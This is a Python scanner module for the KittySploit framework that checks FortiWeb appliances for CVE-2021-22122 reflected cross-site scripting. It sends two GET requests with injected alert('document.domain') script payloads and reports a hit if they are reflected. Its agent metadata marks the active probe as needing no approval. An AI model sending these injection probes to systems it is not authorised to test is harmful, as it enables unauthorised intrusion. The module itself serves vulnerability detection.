#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiWeb 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FortiWeb - Cross Site Scripting Detection',
        'description': 'FortiWeb 6.3.0 through 6.3.7 and versions before 6.2.4 contain an unauthenticated cross-site scripting vulnerability. Improper neutralization of input during web page generation can allow a remote attacker to inject malicious payload in vulnerable API end-points.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'fortiweb', 'xss', 'fortinet', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.fortiguard.com/psirt/FG-IR-20-122',
            'https://twitter.com/ptswarm/status/1357316793753362433',
            'https://fortiguard.com/advisory/FG-IR-20-122',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-22122',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2021-22122',
    }

    def run(self):
        for path in ("/error3?msg=30&data=';alert('document.domain');//", '/omni_success?cmdb_edit_path=");alert(\'document.domain\');//'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ("alert('document.domain')", 'No policy has been chosen.',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='medium',
                    reason="FortiWeb - Cross Site Scripting detected",
                    path=path,
                )
                return True
        return False

